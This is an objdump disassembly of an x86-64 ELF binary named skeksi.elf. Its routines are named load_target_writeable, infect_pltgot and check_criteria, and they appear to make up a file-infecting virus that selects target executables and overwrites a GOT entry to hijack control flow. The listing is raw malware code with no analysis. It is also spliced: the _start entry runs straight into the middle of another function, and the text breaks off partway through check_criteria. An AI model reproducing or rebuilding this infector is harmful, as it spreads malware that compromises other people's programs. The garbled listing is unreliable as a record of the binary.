
skeksi.elf:     file format elf64-x86-64


Disassembly of section .text:

000000000040019c <_start>:
  40019c:	f3 0f 1e fa          	endbr64 
  40150d:	48 63 d0             	movsxd rdx,eax
  401510:	48 89 d0             	mov    rax,rdx
  401513:	48 c1 e0 03          	shl    rax,0x3
  401517:	48 29 d0             	sub    rax,rdx
  40151a:	48 c1 e0 03          	shl    rax,0x3
  40151e:	48 01 c8             	add    rax,rcx
  401521:	48 8b 50 28          	mov    rdx,QWORD PTR [rax+0x28]
  401525:	48 8b 85 40 ff ff ff 	mov    rax,QWORD PTR [rbp-0xc0]
  40152c:	48 89 50 30          	mov    QWORD PTR [rax+0x30],rdx
  401530:	e9 94 00 00 00       	jmp    4015c9 <load_target_writeable+0x2bf>
  401535:	48 8b 85 40 ff ff ff 	mov    rax,QWORD PTR [rbp-0xc0]
  40153c:	48 8b 48 08          	mov    rcx,QWORD PTR [rax+0x8]
  401540:	8b 45 ec             	mov    eax,DWORD PTR [rbp-0x14]
  401543:	48 63 d0             	movsxd rdx,eax
  401546:	48 89 d0             	mov    rax,rdx
  401549:	48 c1 e0 03          	shl    rax,0x3
  40154d:	48 29 d0             	sub    rax,rdx
  401550:	48 c1 e0 03          	shl    rax,0x3
  401554:	48 01 c8             	add    rax,rcx
  401557:	48 8b 50 10          	mov    rdx,QWORD PTR [rax+0x10]
  40155b:	48 8b 85 40 ff ff ff 	mov    rax,QWORD PTR [rbp-0xc0]
  401562:	48 89 50 28          	mov    QWORD PTR [rax+0x28],rdx
  401566:	48 8b 85 40 ff ff ff 	mov    rax,QWORD PTR [rbp-0xc0]
  40156d:	48 8b 48 08          	mov    rcx,QWORD PTR [rax+0x8]
  401571:	8b 45 ec             	mov    eax,DWORD PTR [rbp-0x14]
  401574:	48 63 d0             	movsxd rdx,eax
  401577:	48 89 d0             	mov    rax,rdx
  40157a:	48 c1 e0 03          	shl    rax,0x3
  40157e:	48 29 d0             	sub    rax,rdx
  401581:	48 c1 e0 03          	shl    rax,0x3
  401585:	48 01 c8             	add    rax,rcx
  401588:	48 8b 50 28          	mov    rdx,QWORD PTR [rax+0x28]
  40158c:	48 8b 85 40 ff ff ff 	mov    rax,QWORD PTR [rbp-0xc0]
  401593:	48 89 50 38          	mov    QWORD PTR [rax+0x38],rdx
  401597:	48 8b 85 40 ff ff ff 	mov    rax,QWORD PTR [rbp-0xc0]
  40159e:	48 8b 48 08          	mov    rcx,QWORD PTR [rax+0x8]
  4015a2:	8b 45 ec             	mov    eax,DWORD PTR [rbp-0x14]
  4015a5:	48 63 d0             	movsxd rdx,eax
  4015a8:	48 89 d0             	mov    rax,rdx
  4015ab:	48 c1 e0 03          	shl    rax,0x3
  4015af:	48 29 d0             	sub    rax,rdx
  4015b2:	48 c1 e0 03          	shl    rax,0x3
  4015b6:	48 01 c8             	add    rax,rcx
  4015b9:	48 8b 50 08          	mov    rdx,QWORD PTR [rax+0x8]
  4015bd:	48 8b 85 40 ff ff ff 	mov    rax,QWORD PTR [rbp-0xc0]
  4015c4:	48 89 50 40          	mov    QWORD PTR [rax+0x40],rdx
  4015c8:	90                   	nop
  4015c9:	eb 41                	jmp    40160c <load_target_writeable+0x302>
  4015cb:	48 8b 85 40 ff ff ff 	mov    rax,QWORD PTR [rbp-0xc0]
  4015d2:	48 8b 48 50          	mov    rcx,QWORD PTR [rax+0x50]
  4015d6:	48 8b 85 40 ff ff ff 	mov    rax,QWORD PTR [rbp-0xc0]
  4015dd:	48 8b 70 08          	mov    rsi,QWORD PTR [rax+0x8]
  4015e1:	8b 45 ec             	mov    eax,DWORD PTR [rbp-0x14]
  4015e4:	48 63 d0             	movsxd rdx,eax
  4015e7:	48 89 d0             	mov    rax,rdx
  4015ea:	48 c1 e0 03          	shl    rax,0x3
  4015ee:	48 29 d0             	sub    rax,rdx
  4015f1:	48 c1 e0 03          	shl    rax,0x3
  4015f5:	48 01 f0             	add    rax,rsi
  4015f8:	48 8b 40 08          	mov    rax,QWORD PTR [rax+0x8]
  4015fc:	48 8d 14 01          	lea    rdx,[rcx+rax*1]
  401600:	48 8b 85 40 ff ff ff 	mov    rax,QWORD PTR [rbp-0xc0]
  401607:	48 89 50 18          	mov    QWORD PTR [rax+0x18],rdx
  40160b:	90                   	nop
  40160c:	83 45 ec 01          	add    DWORD PTR [rbp-0x14],0x1
  401610:	48 8b 85 40 ff ff ff 	mov    rax,QWORD PTR [rbp-0xc0]
  401617:	48 8b 00             	mov    rax,QWORD PTR [rax]
  40161a:	0f b7 40 38          	movzx  eax,WORD PTR [rax+0x38]
  40161e:	0f b7 c0             	movzx  eax,ax
  401621:	39 45 ec             	cmp    DWORD PTR [rbp-0x14],eax
  401624:	0f 8c 30 fe ff ff    	jl     40145a <load_target_writeable+0x150>
  40162a:	48 8b 85 40 ff ff ff 	mov    rax,QWORD PTR [rbp-0xc0]
  401631:	48 8b 8d 50 ff ff ff 	mov    rcx,QWORD PTR [rbp-0xb0]
  401638:	48 8b 9d 58 ff ff ff 	mov    rbx,QWORD PTR [rbp-0xa8]
  40163f:	48 89 48 68          	mov    QWORD PTR [rax+0x68],rcx
  401643:	48 89 58 70          	mov    QWORD PTR [rax+0x70],rbx
  401647:	48 8b 8d 60 ff ff ff 	mov    rcx,QWORD PTR [rbp-0xa0]
  40164e:	48 8b 9d 68 ff ff ff 	mov    rbx,QWORD PTR [rbp-0x98]
  401655:	48 89 48 78          	mov    QWORD PTR [rax+0x78],rcx
  401659:	48 89 98 80 00 00 00 	mov    QWORD PTR [rax+0x80],rbx
  401660:	48 8b 8d 70 ff ff ff 	mov    rcx,QWORD PTR [rbp-0x90]
  401667:	48 8b 9d 78 ff ff ff 	mov    rbx,QWORD PTR [rbp-0x88]
  40166e:	48 89 88 88 00 00 00 	mov    QWORD PTR [rax+0x88],rcx
  401675:	48 89 98 90 00 00 00 	mov    QWORD PTR [rax+0x90],rbx
  40167c:	48 8b 4d 80          	mov    rcx,QWORD PTR [rbp-0x80]
  401680:	48 8b 5d 88          	mov    rbx,QWORD PTR [rbp-0x78]
  401684:	48 89 88 98 00 00 00 	mov    QWORD PTR [rax+0x98],rcx
  40168b:	48 89 98 a0 00 00 00 	mov    QWORD PTR [rax+0xa0],rbx
  401692:	48 8b 4d 90          	mov    rcx,QWORD PTR [rbp-0x70]
  401696:	48 8b 5d 98          	mov    rbx,QWORD PTR [rbp-0x68]
  40169a:	48 89 88 a8 00 00 00 	mov    QWORD PTR [rax+0xa8],rcx
  4016a1:	48 89 98 b0 00 00 00 	mov    QWORD PTR [rax+0xb0],rbx
  4016a8:	48 8b 4d a0          	mov    rcx,QWORD PTR [rbp-0x60]
  4016ac:	48 8b 5d a8          	mov    rbx,QWORD PTR [rbp-0x58]
  4016b0:	48 89 88 b8 00 00 00 	mov    QWORD PTR [rax+0xb8],rcx
  4016b7:	48 89 98 c0 00 00 00 	mov    QWORD PTR [rax+0xc0],rbx
  4016be:	48 8b 4d b0          	mov    rcx,QWORD PTR [rbp-0x50]
  4016c2:	48 8b 5d b8          	mov    rbx,QWORD PTR [rbp-0x48]
  4016c6:	48 89 88 c8 00 00 00 	mov    QWORD PTR [rax+0xc8],rcx
  4016cd:	48 89 98 d0 00 00 00 	mov    QWORD PTR [rax+0xd0],rbx
  4016d4:	48 8b 4d c0          	mov    rcx,QWORD PTR [rbp-0x40]
  4016d8:	48 8b 5d c8          	mov    rbx,QWORD PTR [rbp-0x38]
  4016dc:	48 89 88 d8 00 00 00 	mov    QWORD PTR [rax+0xd8],rcx
  4016e3:	48 89 98 e0 00 00 00 	mov    QWORD PTR [rax+0xe0],rbx
  4016ea:	48 8b 4d d0          	mov    rcx,QWORD PTR [rbp-0x30]
  4016ee:	48 8b 5d d8          	mov    rbx,QWORD PTR [rbp-0x28]
  4016f2:	48 89 88 e8 00 00 00 	mov    QWORD PTR [rax+0xe8],rcx
  4016f9:	48 89 98 f0 00 00 00 	mov    QWORD PTR [rax+0xf0],rbx
  401700:	48 8b 45 80          	mov    rax,QWORD PTR [rbp-0x80]
  401704:	48 89 c2             	mov    rdx,rax
  401707:	48 8b 85 40 ff ff ff 	mov    rax,QWORD PTR [rbp-0xc0]
  40170e:	48 89 50 58          	mov    QWORD PTR [rax+0x58],rdx
  401712:	b8 00 00 00 00       	mov    eax,0x0
  401717:	48 81 c4 b8 00 00 00 	add    rsp,0xb8
  40171e:	5b                   	pop    rbx
  40171f:	5d                   	pop    rbp
  401720:	c3                   	ret    

0000000000401721 <infect_pltgot>:
  401721:	f3 0f 1e fa          	endbr64 
  401725:	55                   	push   rbp
  401726:	48 89 e5             	mov    rbp,rsp
  401729:	48 83 ec 70          	sub    rsp,0x70
  40172d:	48 89 7d 98          	mov    QWORD PTR [rbp-0x68],rdi
  401731:	48 89 75 90          	mov    QWORD PTR [rbp-0x70],rsi
  401735:	c7 45 b4 00 00 00 00 	mov    DWORD PTR [rbp-0x4c],0x0
  40173c:	c7 45 f8 ff ff ff ff 	mov    DWORD PTR [rbp-0x8],0xffffffff
  401743:	48 8b 45 98          	mov    rax,QWORD PTR [rbp-0x68]
  401747:	48 8b 40 18          	mov    rax,QWORD PTR [rax+0x18]
  40174b:	48 89 45 a8          	mov    QWORD PTR [rbp-0x58],rax
  40174f:	48 c7 45 c0 00 00 00 	mov    QWORD PTR [rbp-0x40],0x0
  401756:	00 
  401757:	48 c7 45 b8 00 00 00 	mov    QWORD PTR [rbp-0x48],0x0
  40175e:	00 
  40175f:	c7 45 fc 00 00 00 00 	mov    DWORD PTR [rbp-0x4],0x0
  401766:	e9 67 01 00 00       	jmp    4018d2 <infect_pltgot+0x1b1>
  40176b:	8b 45 fc             	mov    eax,DWORD PTR [rbp-0x4]
  40176e:	48 98                	cdqe   
  401770:	48 c1 e0 04          	shl    rax,0x4
  401774:	48 89 c2             	mov    rdx,rax
  401777:	48 8b 45 a8          	mov    rax,QWORD PTR [rbp-0x58]
  40177b:	48 01 d0             	add    rax,rdx
  40177e:	48 8b 00             	mov    rax,QWORD PTR [rax]
  401781:	48 83 f8 17          	cmp    rax,0x17
  401785:	0f 87 43 01 00 00    	ja     4018ce <infect_pltgot+0x1ad>
  40178b:	48 8d 14 85 00 00 00 	lea    rdx,[rax*4+0x0]
  401792:	00 
  401793:	48 8d 05 96 15 00 00 	lea    rax,[rip+0x1596]        # 402d30 <display_skeksi+0x9f>
  40179a:	8b 04 02             	mov    eax,DWORD PTR [rdx+rax*1]
  40179d:	48 98                	cdqe   
  40179f:	48 8d 15 8a 15 00 00 	lea    rdx,[rip+0x158a]        # 402d30 <display_skeksi+0x9f>
  4017a6:	48 01 d0             	add    rax,rdx
  4017a9:	3e ff e0             	notrack jmp rax
  4017ac:	48 8b 45 98          	mov    rax,QWORD PTR [rbp-0x68]
  4017b0:	48 8b 50 50          	mov    rdx,QWORD PTR [rax+0x50]
  4017b4:	8b 45 fc             	mov    eax,DWORD PTR [rbp-0x4]
  4017b7:	48 98                	cdqe   
  4017b9:	48 c1 e0 04          	shl    rax,0x4
  4017bd:	48 89 c1             	mov    rcx,rax
  4017c0:	48 8b 45 a8          	mov    rax,QWORD PTR [rbp-0x58]
  4017c4:	48 01 c8             	add    rax,rcx
  4017c7:	48 8b 48 08          	mov    rcx,QWORD PTR [rax+0x8]
  4017cb:	48 8b 45 98          	mov    rax,QWORD PTR [rbp-0x68]
  4017cf:	48 8b 40 20          	mov    rax,QWORD PTR [rax+0x20]
  4017d3:	48 29 c1             	sub    rcx,rax
  4017d6:	48 89 c8             	mov    rax,rcx
  4017d9:	48 01 d0             	add    rax,rdx
  4017dc:	48 89 45 f0          	mov    QWORD PTR [rbp-0x10],rax
  4017e0:	e9 e9 00 00 00       	jmp    4018ce <infect_pltgot+0x1ad>
  4017e5:	48 8b 45 98          	mov    rax,QWORD PTR [rbp-0x68]
  4017e9:	48 8b 50 50          	mov    rdx,QWORD PTR [rax+0x50]
  4017ed:	48 8b 45 98          	mov    rax,QWORD PTR [rbp-0x68]
  4017f1:	48 8b 48 40          	mov    rcx,QWORD PTR [rax+0x40]
  4017f5:	8b 45 fc             	mov    eax,DWORD PTR [rbp-0x4]
  4017f8:	48 98                	cdqe   
  4017fa:	48 c1 e0 04          	shl    rax,0x4
  4017fe:	48 89 c6             	mov    rsi,rax
  401801:	48 8b 45 a8          	mov    rax,QWORD PTR [rbp-0x58]
  401805:	48 01 f0             	add    rax,rsi
  401808:	48 8b 70 08          	mov    rsi,QWORD PTR [rax+0x8]
  40180c:	48 8b 45 98          	mov    rax,QWORD PTR [rbp-0x68]
  401810:	48 8b 40 28          	mov    rax,QWORD PTR [rax+0x28]
  401814:	48 29 c6             	sub    rsi,rax
  401817:	48 89 f0             	mov    rax,rsi
  40181a:	48 01 c8             	add    rax,rcx
  40181d:	48 01 d0             	add    rax,rdx
  401820:	48 89 45 e0          	mov    QWORD PTR [rbp-0x20],rax
  401824:	e9 a5 00 00 00       	jmp    4018ce <infect_pltgot+0x1ad>
  401829:	48 8b 45 98          	mov    rax,QWORD PTR [rbp-0x68]
  40182d:	48 8b 50 50          	mov    rdx,QWORD PTR [rax+0x50]
  401831:	8b 45 fc             	mov    eax,DWORD PTR [rbp-0x4]
  401834:	48 98                	cdqe   
  401836:	48 c1 e0 04          	shl    rax,0x4
  40183a:	48 89 c1             	mov    rcx,rax
  40183d:	48 8b 45 a8          	mov    rax,QWORD PTR [rbp-0x58]
  401841:	48 01 c8             	add    rax,rcx
  401844:	48 8b 48 08          	mov    rcx,QWORD PTR [rax+0x8]
  401848:	48 8b 45 98          	mov    rax,QWORD PTR [rbp-0x68]
  40184c:	48 8b 40 20          	mov    rax,QWORD PTR [rax+0x20]
  401850:	48 29 c1             	sub    rcx,rax
  401853:	48 89 c8             	mov    rax,rcx
  401856:	48 01 d0             	add    rax,rdx
  401859:	48 89 45 d8          	mov    QWORD PTR [rbp-0x28],rax
  40185d:	eb 6f                	jmp    4018ce <infect_pltgot+0x1ad>
  40185f:	8b 45 fc             	mov    eax,DWORD PTR [rbp-0x4]
  401862:	48 98                	cdqe   
  401864:	48 c1 e0 04          	shl    rax,0x4
  401868:	48 89 c2             	mov    rdx,rax
  40186b:	48 8b 45 a8          	mov    rax,QWORD PTR [rbp-0x58]
  40186f:	48 01 d0             	add    rax,rdx
  401872:	48 8b 40 08          	mov    rax,QWORD PTR [rax+0x8]
  401876:	48 89 45 d0          	mov    QWORD PTR [rbp-0x30],rax
  40187a:	eb 52                	jmp    4018ce <infect_pltgot+0x1ad>
  40187c:	48 8b 45 98          	mov    rax,QWORD PTR [rbp-0x68]
  401880:	48 8b 50 50          	mov    rdx,QWORD PTR [rax+0x50]
  401884:	8b 45 fc             	mov    eax,DWORD PTR [rbp-0x4]
  401887:	48 98                	cdqe   
  401889:	48 c1 e0 04          	shl    rax,0x4
  40188d:	48 89 c1             	mov    rcx,rax
  401890:	48 8b 45 a8          	mov    rax,QWORD PTR [rbp-0x58]
  401894:	48 01 c8             	add    rax,rcx
  401897:	48 8b 48 08          	mov    rcx,QWORD PTR [rax+0x8]
  40189b:	48 8b 45 98          	mov    rax,QWORD PTR [rbp-0x68]
  40189f:	48 8b 40 20          	mov    rax,QWORD PTR [rax+0x20]
  4018a3:	48 29 c1             	sub    rcx,rax
  4018a6:	48 89 c8             	mov    rax,rcx
  4018a9:	48 01 d0             	add    rax,rdx
  4018ac:	48 89 45 e8          	mov    QWORD PTR [rbp-0x18],rax
  4018b0:	eb 1c                	jmp    4018ce <infect_pltgot+0x1ad>
  4018b2:	8b 45 fc             	mov    eax,DWORD PTR [rbp-0x4]
  4018b5:	48 98                	cdqe   
  4018b7:	48 c1 e0 04          	shl    rax,0x4
  4018bb:	48 89 c2             	mov    rdx,rax
  4018be:	48 8b 45 a8          	mov    rax,QWORD PTR [rbp-0x58]
  4018c2:	48 01 d0             	add    rax,rdx
  4018c5:	48 8b 40 08          	mov    rax,QWORD PTR [rax+0x8]
  4018c9:	48 89 45 c8          	mov    QWORD PTR [rbp-0x38],rax
  4018cd:	90                   	nop
  4018ce:	83 45 fc 01          	add    DWORD PTR [rbp-0x4],0x1
  4018d2:	8b 45 fc             	mov    eax,DWORD PTR [rbp-0x4]
  4018d5:	48 98                	cdqe   
  4018d7:	48 c1 e0 04          	shl    rax,0x4
  4018db:	48 89 c2             	mov    rdx,rax
  4018de:	48 8b 45 a8          	mov    rax,QWORD PTR [rbp-0x58]
  4018e2:	48 01 d0             	add    rax,rdx
  4018e5:	48 8b 00             	mov    rax,QWORD PTR [rax]
  4018e8:	48 85 c0             	test   rax,rax
  4018eb:	0f 85 7a fe ff ff    	jne    40176b <infect_pltgot+0x4a>
  4018f1:	48 83 7d f0 00       	cmp    QWORD PTR [rbp-0x10],0x0
  4018f6:	74 07                	je     4018ff <infect_pltgot+0x1de>
  4018f8:	48 83 7d e0 00       	cmp    QWORD PTR [rbp-0x20],0x0
  4018fd:	75 0a                	jne    401909 <infect_pltgot+0x1e8>
  4018ff:	b8 ff ff ff ff       	mov    eax,0xffffffff
  401904:	e9 af 01 00 00       	jmp    401ab8 <infect_pltgot+0x397>
  401909:	c7 45 fc 00 00 00 00 	mov    DWORD PTR [rbp-0x4],0x0
  401910:	eb 47                	jmp    401959 <infect_pltgot+0x238>
  401912:	8b 45 fc             	mov    eax,DWORD PTR [rbp-0x4]
  401915:	48 63 d0             	movsxd rdx,eax
  401918:	48 89 d0             	mov    rax,rdx
  40191b:	48 01 c0             	add    rax,rax
  40191e:	48 01 d0             	add    rax,rdx
  401921:	48 c1 e0 03          	shl    rax,0x3
  401925:	48 89 c2             	mov    rdx,rax
  401928:	48 8b 45 f0          	mov    rax,QWORD PTR [rbp-0x10]
  40192c:	48 01 d0             	add    rax,rdx
  40192f:	8b 00                	mov    eax,DWORD PTR [rax]
  401931:	89 c2                	mov    edx,eax
  401933:	48 8b 45 d8          	mov    rax,QWORD PTR [rbp-0x28]
  401937:	48 01 d0             	add    rax,rdx
  40193a:	48 8d 35 e7 13 00 00 	lea    rsi,[rip+0x13e7]        # 402d28 <display_skeksi+0x97>
  401941:	48 89 c7             	mov    rdi,rax
  401944:	e8 53 12 00 00       	call   402b9c <_strcmp>
  401949:	85 c0                	test   eax,eax
  40194b:	75 08                	jne    401955 <infect_pltgot+0x234>
  40194d:	8b 45 fc             	mov    eax,DWORD PTR [rbp-0x4]
  401950:	89 45 f8             	mov    DWORD PTR [rbp-0x8],eax
  401953:	eb 2b                	jmp    401980 <infect_pltgot+0x25f>
  401955:	83 45 fc 01          	add    DWORD PTR [rbp-0x4],0x1
  401959:	8b 45 fc             	mov    eax,DWORD PTR [rbp-0x4]
  40195c:	48 63 d0             	movsxd rdx,eax
  40195f:	48 89 d0             	mov    rax,rdx
  401962:	48 01 c0             	add    rax,rax
  401965:	48 01 d0             	add    rax,rdx
  401968:	48 c1 e0 03          	shl    rax,0x3
  40196c:	48 89 c2             	mov    rdx,rax
  40196f:	48 8b 45 f0          	mov    rax,QWORD PTR [rbp-0x10]
  401973:	48 01 d0             	add    rax,rdx
  401976:	8b 00                	mov    eax,DWORD PTR [rax]
  401978:	89 c0                	mov    eax,eax
  40197a:	48 39 45 d0          	cmp    QWORD PTR [rbp-0x30],rax
  40197e:	73 92                	jae    401912 <infect_pltgot+0x1f1>
  401980:	83 7d f8 ff          	cmp    DWORD PTR [rbp-0x8],0xffffffff
  401984:	75 0a                	jne    401990 <infect_pltgot+0x26f>
  401986:	b8 ff ff ff ff       	mov    eax,0xffffffff
  40198b:	e9 28 01 00 00       	jmp    401ab8 <infect_pltgot+0x397>
  401990:	c7 45 fc 00 00 00 00 	mov    DWORD PTR [rbp-0x4],0x0
  401997:	e9 c4 00 00 00       	jmp    401a60 <infect_pltgot+0x33f>
  40199c:	8b 45 fc             	mov    eax,DWORD PTR [rbp-0x4]
  40199f:	48 63 d0             	movsxd rdx,eax
  4019a2:	48 89 d0             	mov    rax,rdx
  4019a5:	48 01 c0             	add    rax,rax
  4019a8:	48 01 d0             	add    rax,rdx
  4019ab:	48 c1 e0 03          	shl    rax,0x3
  4019af:	48 89 c2             	mov    rdx,rax
  4019b2:	48 8b 45 e8          	mov    rax,QWORD PTR [rbp-0x18]
  4019b6:	48 01 d0             	add    rax,rdx
  4019b9:	48 8b 40 08          	mov    rax,QWORD PTR [rax+0x8]
  4019bd:	48 c1 e8 20          	shr    rax,0x20
  4019c1:	48 89 c2             	mov    rdx,rax
  4019c4:	48 89 d0             	mov    rax,rdx
  4019c7:	48 01 c0             	add    rax,rax
  4019ca:	48 01 d0             	add    rax,rdx
  4019cd:	48 c1 e0 03          	shl    rax,0x3
  4019d1:	48 89 c2             	mov    rdx,rax
  4019d4:	48 8b 45 f0          	mov    rax,QWORD PTR [rbp-0x10]
  4019d8:	48 01 d0             	add    rax,rdx
  4019db:	8b 00                	mov    eax,DWORD PTR [rax]
  4019dd:	89 c2                	mov    edx,eax
  4019df:	48 8b 45 d8          	mov    rax,QWORD PTR [rbp-0x28]
  4019e3:	48 01 d0             	add    rax,rdx
  4019e6:	48 8d 35 3b 13 00 00 	lea    rsi,[rip+0x133b]        # 402d28 <display_skeksi+0x97>
  4019ed:	48 89 c7             	mov    rdi,rax
  4019f0:	e8 a7 11 00 00       	call   402b9c <_strcmp>
  4019f5:	85 c0                	test   eax,eax
  4019f7:	75 63                	jne    401a5c <infect_pltgot+0x33b>
  4019f9:	8b 45 fc             	mov    eax,DWORD PTR [rbp-0x4]
  4019fc:	48 63 d0             	movsxd rdx,eax
  4019ff:	48 89 d0             	mov    rax,rdx
  401a02:	48 01 c0             	add    rax,rax
  401a05:	48 01 d0             	add    rax,rdx
  401a08:	48 c1 e0 03          	shl    rax,0x3
  401a0c:	48 89 c2             	mov    rdx,rax
  401a0f:	48 8b 45 e8          	mov    rax,QWORD PTR [rbp-0x18]
  401a13:	48 01 d0             	add    rax,rdx
  401a16:	48 8b 00             	mov    rax,QWORD PTR [rax]
  401a19:	48 89 45 c0          	mov    QWORD PTR [rbp-0x40],rax
  401a1d:	48 8b 45 98          	mov    rax,QWORD PTR [rbp-0x68]
  401a21:	48 8b 48 40          	mov    rcx,QWORD PTR [rax+0x40]
  401a25:	8b 45 fc             	mov    eax,DWORD PTR [rbp-0x4]
  401a28:	48 63 d0             	movsxd rdx,eax
  401a2b:	48 89 d0             	mov    rax,rdx
  401a2e:	48 01 c0             	add    rax,rax
  401a31:	48 01 d0             	add    rax,rdx
  401a34:	48 c1 e0 03          	shl    rax,0x3
  401a38:	48 89 c2             	mov    rdx,rax
  401a3b:	48 8b 45 e8          	mov    rax,QWORD PTR [rbp-0x18]
  401a3f:	48 01 d0             	add    rax,rdx
  401a42:	48 8b 10             	mov    rdx,QWORD PTR [rax]
  401a45:	48 8b 45 98          	mov    rax,QWORD PTR [rbp-0x68]
  401a49:	48 8b 40 28          	mov    rax,QWORD PTR [rax+0x28]
  401a4d:	48 29 c2             	sub    rdx,rax
  401a50:	48 89 d0             	mov    rax,rdx
  401a53:	48 01 c8             	add    rax,rcx
  401a56:	48 89 45 b8          	mov    QWORD PTR [rbp-0x48],rax
  401a5a:	eb 2b                	jmp    401a87 <infect_pltgot+0x366>
  401a5c:	83 45 fc 01          	add    DWORD PTR [rbp-0x4],0x1
  401a60:	8b 45 fc             	mov    eax,DWORD PTR [rbp-0x4]
  401a63:	48 63 c8             	movsxd rcx,eax
  401a66:	48 8b 45 c8          	mov    rax,QWORD PTR [rbp-0x38]
  401a6a:	48 ba ab aa aa aa aa 	movabs rdx,0xaaaaaaaaaaaaaaab
  401a71:	aa aa aa 
  401a74:	48 f7 e2             	mul    rdx
  401a77:	48 89 d0             	mov    rax,rdx
  401a7a:	48 c1 e8 04          	shr    rax,0x4
  401a7e:	48 39 c1             	cmp    rcx,rax
  401a81:	0f 82 15 ff ff ff    	jb     40199c <infect_pltgot+0x27b>
  401a87:	48 83 7d c0 00       	cmp    QWORD PTR [rbp-0x40],0x0
  401a8c:	75 07                	jne    401a95 <infect_pltgot+0x374>
  401a8e:	b8 ff ff ff ff       	mov    eax,0xffffffff
  401a93:	eb 23                	jmp    401ab8 <infect_pltgot+0x397>
  401a95:	48 8b 45 98          	mov    rax,QWORD PTR [rbp-0x68]
  401a99:	48 8b 50 50          	mov    rdx,QWORD PTR [rax+0x50]
  401a9d:	48 8b 45 b8          	mov    rax,QWORD PTR [rbp-0x48]
  401aa1:	48 01 d0             	add    rax,rdx
  401aa4:	48 89 45 a0          	mov    QWORD PTR [rbp-0x60],rax
  401aa8:	48 8b 45 a0          	mov    rax,QWORD PTR [rbp-0x60]
  401aac:	48 8b 55 90          	mov    rdx,QWORD PTR [rbp-0x70]
  401ab0:	48 89 10             	mov    QWORD PTR [rax],rdx
  401ab3:	b8 00 00 00 00       	mov    eax,0x0
  401ab8:	c9                   	leave  
  401ab9:	c3                   	ret    

0000000000401aba <check_criteria>:
  401aba:	f3 0f 1e fa          	endbr64 
  401abe:	55                   	push   rbp
  401abf:	48 89 e5             	mov    rbp,rsp
  401ac2:	48 81 ec 00 10 00 00 	sub    rsp,0x1000
  401ac9:	48 83 0c 24 00       	or     QWORD PTR [rsp],0x0
  401ace:	48 81 ec d0 00 00 00 	sub    rsp,0xd0
  401ad5:	48 89 bd 38 ef ff ff 	mov    QWORD PTR [rbp-0x10c8],rdi
  401adc:	c7 45 f4 00 00 00 00 	mov    DWORD PTR [rbp-0xc],0x0
  401ae3:	48 8b 85 38 ef ff ff 	mov    rax,QWORD PTR [rbp-0x10c8]
  401aea:	ba 00 00 00 00       	mov    edx,0x0
  401aef:	be 00 00 00 00       	mov    esi,0x0
  401af4:	48 89 c7             	mov    rdi,rax
  401af7:	e8 d8 04 00 00       	call   401fd4 <_open>
  401afc:	89 45 f0             	mov    DWORD PTR [rbp-0x10],eax
  401aff:	83 7d f0 00          	cmp    DWORD PTR [rbp-0x10],0x0
  401b03:	79 0a                	jns    401b0f <check_criteria+0x55>
  401b05:	b8 ff ff ff ff       	mov    eax,0xffffffff
  401b0a:	e9 27 01 00 00       	jmp    401c36 <check_criteria+0x17c>
  401b0f:	8b 45 f0             	mov    eax,DWORD PTR [rbp-0x10]
  401b12:	48 98                	cdqe   
  401b14:	48 8d 8d 40 ef ff ff 	lea    rcx,[rbp-0x10c0]
  401b1b:	ba 00 10 00 00       	mov    edx,0x1000
  401b20:	48 89 ce             	mov    rsi,rcx
  401b23:	48 89 c7             	mov    rdi,rax
  401b26:	e8 fd 04 00 00       	call   402028 <_read>
  401b2b:	85 c0                	test   eax,eax
  401b2d:	79 0a                	jns    401b39 <check_criteria+0x7f>
  401b2f:	b8 ff ff ff ff       	mov    eax,0xffffffff
  401b34:	e9 fd 00 00 00       	jmp    401c36 <check_criteria+0x17c>
  401b39:	8b 45 f0             	mov    eax,DWORD PTR [rbp-0x10]
  401b3c:	89 c7                	mov    edi,eax
  401b3e:	e8 c7 04 00 00       	call   40200a <_close>
  401b43:	48 8d 85 40 ef ff ff 	lea    rax,[rbp-0x10c0]
  401b4a:	48 89 45 e8          	mov    QWORD PTR [rbp-0x18],rax
  401b4e:	48 8b 45 e8          	mov    rax,QWORD PTR [rbp-0x18]
  401b52:	48 8b 40 20          	mov    rax,QWORD PTR [rax+0x20]
  401b56:	48 8d 95 40 ef ff ff 	lea    rdx,[rbp-0x10c0]
  401b5d:	48 01 d0             	add    rax,rdx
  401b60:	48 89 45 e0          	mov    QWORD PTR [rbp-0x20],rax
  401b64:	48 8d 85 40 ef ff ff 	lea    rax,[rbp-0x10c0]
  401b6b:	ba 04 00 00 00       	mov    edx,0x4
  401b70:	48 89 c6             	mov    rsi,rax
  401b73:	48 8d 3d 16 12 00 00 	lea    rdi,[rip+0x1216]        # 402d90 <display_skeksi+0xff>
